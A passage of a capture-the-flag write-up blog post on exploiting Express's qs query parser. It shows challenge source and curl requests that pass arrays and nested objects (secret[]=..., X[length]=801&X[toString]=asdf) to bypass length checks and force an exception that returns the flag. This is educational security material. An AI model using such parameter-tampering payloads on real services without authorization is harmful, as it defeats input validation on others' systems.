+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>secret</span>.<span style=color:#a6e22e>length</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>5</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>(<span style=color:#e6db74>&#34;I don&#39;t allow it.&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>  }
+</span></span></code></pre></div><blockquote><p>Listing 0x21 Query length check</p></blockquote><p>And unfortunately <code>len("GIVEmeTHEflagNOW") = 16</code> which is greater than 5. So we have to pass an object via <code>secret</code> parameter that will be the length that is smaller than 5 and if referenced directly will return secret phrase. If you know the PHP, you are probably familiar with arrays. That was my first guess and in a few attempts, I&rsquo;ve managed to get the flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~ ❯ curl <span style=color:#e6db74>&#39;http://35.204.139.205:5001/?secret=GIVEmeTHEflagNOW&amp;secret=Bong&#39;</span>
+</span></span><span style=display:flex><span>Level <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Wrong secret.% 
+</span></span><span style=display:flex><span>~ ❯ curl <span style=color:#e6db74>&#39;http://35.204.139.205:5001/?secret[]=IVEmeTHEflagNOW&#39;</span> <span style=color:#75715e># typo :)          </span>
+</span></span><span style=display:flex><span>Level <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Wrong secret.%                                                                                                       
+</span></span><span style=display:flex><span>~ ❯ curl <span style=color:#e6db74>&#39;http://35.204.139.205:5001/?secret[]=GIVEmeTHEflagNOW&#39;</span>
+</span></span><span style=display:flex><span>Level <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>CTF<span style=color:#f92672>{</span>SmellsLikePHP<span style=color:#f92672>}</span>%  
+</span></span></code></pre></div><p>Aaaand <em>tadam!</em> we got the flag. The parameter is the array and array.length is equal to 1. That strange bahaviour is caused by <code>qs</code> module [4], the default query parser of the <code>Express</code>. To read more about some quirks in query parsing I higly recommend you this [5] article.</p><h1 id=0x30-task-0x025002>0x30 Task 0x02:5002<a href=#0x30-task-0x025002 class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Ok, so far so good. Previous challs were pretty easy and straightforward. Now comes time for something more complex. Let&rsquo;s do <code>PORT++</code> and visit <code>http://35.204.139.205:5002/</code></p><p>The code is as always returned on <code>GET /</code> request without parameters.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#a6e22e>Level</span> <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>express</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;express&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>fs</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;fs&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>PORT</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>5002</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>FLAG</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>FLAG</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#34;???&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>SOURCE</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>readFileSync</span>(<span style=color:#e6db74>&#39;app.js&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>app</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>express</span>()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/&#39;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>statusCode</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>200</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>setHeader</span>(<span style=color:#e6db74>&#39;Content-Type&#39;</span>, <span style=color:#e6db74>&#39;text/plain;charset=utf-8&#39;</span>)
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>write</span>(<span style=color:#e6db74>&#34;Level 2\n\n&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(<span style=color:#e6db74>&#39;X&#39;</span> <span style=color:#66d9ef>in</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>(<span style=color:#a6e22e>SOURCE</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>X</span>.<span style=color:#a6e22e>length</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>800</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>s</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>(<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>X</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>s</span>.<span style=color:#a6e22e>length</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>(<span style=color:#e6db74>&#34;Go away.&#34;</span>)
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>k</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>X</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;&gt;&#39;</span>
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>(<span style=color:#e6db74>&#34;Close, but no cigar.&#34;</span>)
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span> {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>(<span style=color:#a6e22e>FLAG</span>)
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>(<span style=color:#e6db74>&#34;No way.&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>})
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>listen</span>(<span style=color:#a6e22e>PORT</span>, () =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`Challenge listening at port </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>PORT</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>)
+</span></span><span style=display:flex><span>}) 
+</span></span></code></pre></div><blockquote><p>Listing 0x30 Challenge code</p></blockquote><p>This challenge was pretty hard for me. First of all to obtain the flag, which is stored in the enviromental variable FLAG, is to do the <code>GET</code> request on the <code>/</code> resource with specified <code>X</code> parameter. Then only when <code>req.query.X.length</code> is greater than 800 and when stringified is shorter than 100 it has to throw an exception when concatenated with <code>'&lt;'</code> and <code>'>'</code>.</p><p>Pretty much huh? So I started by reading about <code>stringify</code> function here [6] and tried that:</p><p><img src=moz_stringify.png alt="Mozilla JS sandbox"></p><p>Notice the first line. My first wrong assumption was that stringify should create a valid JSON from input and then serialize it to the String object. Which is not the case here, so multiple replication of the same key=>value entries will not work here. But previously linked article ([5]) pointed me another solution. For the first check. Because of <code>qs</code> usage in this simple code, one can pass nested structures. This nested value could be JSON with length field. Then the reference to this field will return the value stored there not the real length. Watch this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>text</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;{ &#34;employees&#34; : [&#39;</span> <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;{ &#34;firstName&#34;:&#34;John&#34; , &#34;lastName&#34;:&#34;Doe&#34; },&#39;</span> <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;{ &#34;firstName&#34;:&#34;Anna&#34; , &#34;lastName&#34;:&#34;Smith&#34; },&#39;</span> <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;{ &#34;firstName&#34;:&#34;Peter&#34; , &#34;lastName&#34;:&#34;Jones&#34; } ]}&#39;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>parse</span>(<span style=color:#a6e22e>text</span>)
+</span></span><span style=display:flex><span>{<span style=color:#960050;background-color:#1e0010>…</span>}
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>​</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>employees</span><span style=color:#f92672>:</span> Array(<span style=color:#ae81ff>3</span>) [ {<span style=color:#960050;background-color:#1e0010>…</span>}, {<span style=color:#960050;background-color:#1e0010>…</span>}, {<span style=color:#960050;background-color:#1e0010>…</span>} ]
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>​</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>prototype</span><span style=color:#f92672>&gt;:</span> {<span style=color:#960050;background-color:#1e0010>…</span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// the tadaaaa part:
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>parse</span>(<span style=color:#a6e22e>text</span>).<span style=color:#a6e22e>employees</span>
+</span></span><span style=display:flex><span>(<span style=color:#ae81ff>3</span>) [<span style=color:#960050;background-color:#1e0010>…</span>]
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>​</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> Object { <span style=color:#a6e22e>firstName</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;John&#34;</span>, <span style=color:#a6e22e>lastName</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Doe&#34;</span> }
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>​</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> Object { <span style=color:#a6e22e>firstName</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Anna&#34;</span>, <span style=color:#a6e22e>lastName</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Smith&#34;</span> }
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>​</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span><span style=color:#f92672>:</span> Object { <span style=color:#a6e22e>firstName</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Peter&#34;</span>, <span style=color:#a6e22e>lastName</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;Jones&#34;</span> }
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>​</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>length</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3</span>
+</span></span></code></pre></div><blockquote><p>Listing 0x31 Referencing object fields</p></blockquote><p>So the first check will be passed if <code>X[length]=x where x > 800</code>. I&rsquo;ve chosen the first obvious value <code>801</code>.</p><pre tabindex=0><code>~ ❯ curl -i -s -k -X $&#39;GET&#39; &#39;http://35.204.139.205:5002/?X[length]=801&#39;     
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: text/plain;charset=utf-8
+Date: Tue, 19 May 2020 19:32:20 GMT
+Connection: keep-alive
+Transfer-Encoding: chunked
+
+Level 2
+
+Close, but no cigar.%       
+</code></pre><blockquote><p>Listing 0x32 Partially solved challenge</p></blockquote><p>And looking at this response tells us that two first checks were passed. Second one is true because the length of <code>X{length:801}</code> interpreted as string is way smaller than 100.</p><p>Last but not least there is this <code>catch</code> part where the flag is printed. To jump there the concatenation must throw an exception. But how to trigger that. I&rsquo;m not so fluent at JS so with my little knowledge from other languages I&rsquo;ve tried different types of objects. And&mldr; all of them were <em>automagically</em> converted to string and then <code>+</code> operator was used.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>d</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>parse</span>(<span style=color:#a6e22e>text</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>undefined</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>d</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;&gt;&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;[object Object]&gt;&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>NaN</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;&gt;&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;NaN&gt;&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>true</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>true</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>true</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;&gt;&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;true&gt;&#34;</span>
+</span></span></code></pre></div><blockquote><p>Listing 0x33 Weird concatenation</p></blockquote><p>No error due to concatenation string with <code>null</code>, <code>Object</code> or <code>NaN</code> objects looks crazy to me but all these objects have methods. And I&rsquo;ve listed all of them (with other properties, but didn&rsquo;t wanted to mess around with JS too much)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>Object.<span style=color:#a6e22e>keys</span>(<span style=color:#66d9ef>NaN</span>)
+</span></span><span style=display:flex><span>[]
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>​</span>
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>​</span>
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span><span style=color:#a6e22e>push</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>push</span>()
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>​​</span>
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Symbol</span>(<span style=color:#a6e22e>Symbol</span>.<span style=color:#a6e22e>iterator</span>)<span style=color:#f92672>:</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>values</span>()
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>​​</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Symbol</span>(<span style=color:#a6e22e>Symbol</span>.<span style=color:#a6e22e>unscopables</span>)<span style=color:#f92672>:</span> Object { <span style=color:#a6e22e>copyWithin</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>, <span style=color:#a6e22e>entries</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>, <span style=color:#a6e22e>fill</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>, <span style=color:#960050;background-color:#1e0010>…</span> }
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>​​</span>
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span><span style=color:#a6e22e>toLocaleString</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>toLocaleString</span>()
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>​​​</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>toString</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>toString</span>()
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>​​​</span>
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>​</span>
+</span></span></code></pre></div><blockquote><p>Listing 0x34 Some object methods (and fields)</p></blockquote><p>So there is something like <code>toString()</code> function which converts for example <code>NaN</code> to <code>"NaN"</code> (string thing). So how about playing around JSON object created with the <code>qs</code> parser? This should throw TypeError (or it just does that in Web Browser console)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&gt;</span> <span style=color:#66d9ef>var</span>  <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Object()
+</span></span><span style=display:flex><span><span style=color:#66d9ef>undefined</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>a</span>.<span style=color:#a6e22e>toString</span>()
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;[object Object]&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>a</span>.<span style=color:#a6e22e>toString</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;asdf&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;asdf&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>a</span>.<span style=color:#a6e22e>toString</span>()
+</span></span><span style=display:flex><span><span style=color:#a6e22e>TypeError</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>a</span>.<span style=color:#a6e22e>toString</span> <span style=color:#a6e22e>is</span> <span style=color:#a6e22e>not</span> <span style=color:#a6e22e>a</span> <span style=color:#66d9ef>function</span>
+</span></span></code></pre></div><blockquote><p>Listing 0x35 Overwritting toString() method</p></blockquote><p>And trying that on the remote system gives us:</p><pre tabindex=0><code>~ ❯ curl -i -s -k -X $&#39;GET&#39; &#39;http://35.204.139.205:5002/?X[length]=801&amp;X[toString]=asdf&#39;
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: text/plain;charset=utf-8
+Date: Tue, 19 May 2020 20:49:39 GMT
+Connection: keep-alive
+Transfer-Encoding: chunked
+
+Level 2
+
+CTF{WaaayBeyondPHPLikeWTF}%  
+</code></pre><p>Worked like a charm! We&rsquo;ve succesfully overwritten <code>toString()</code> method in this object.</p><h1 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Some behaviours may not be <em>faulty</em> (which is questionable when it comes to JS) but pretty confusing and unexpected. Default query parser in <code>Express</code> framework is pretty powerfull. But with the great power comes great responsibility. And that&rsquo;s why it is crucial to try to think about all different code paths that may be generated implicitly. If you are a developer - stick to the advices given in [5]. You probably do not need so much firepower when handling query parameters.</p><p>That&rsquo;s all for today. Now I&rsquo;m back on track doing stuff, so I promise there will be new content soon. I mean really <em>soon</em> so <strong>!soonish</strong> or <strong>!sooner</strong>. C u on the Internet!</p><blockquote><p><code>foxtrot_charlie</code> over and out</p></blockquote><h1 id=links>Links<a href=#links class=hanchor arialabel=Anchor>&#8983;</a></h1><p>[1] <a href=https://flask.palletsprojects.com/en/1.1.x/>Flask</a><br>[2] Python 3.6 f-strings <a href=https://docs.python.org/3/whatsnew/3.6.html#whatsnew36-pep498>Chanelog</a> <a href=https://www.python.org/dev/peps/pep-0498/>PEP 498</a><br>[3] HTTP Request-Response schema <a href=https://tools.ietf.org/html/rfc2616#section-4>RFC</a><br>[4] <a href=https://www.npmjs.com/package/qs>qs</a><br>[5] <a href=https://evanhahn.com/gotchas-with-express-query-parsing-and-how-to-avoid-them/>Gotchas with Express query parsing (and how to avoid them)</a><br>[6] <a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify>JSON.stringify()</a></p><h1 id=update-22052020-ddmmyyyy>UPDATE 22.05.2020 (DD:MM:YYYY)<a href=#update-22052020-ddmmyyyy class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Fixed typos and error in the listing 0x21. Thank you <code>@noodly</code>!</p></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>copyright by foxtrot_charlie</span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://foxtrotlabs.cc/assets/main.js></script><script src=https://foxtrotlabs.cc/assets/prism.js></script></div></body></html>
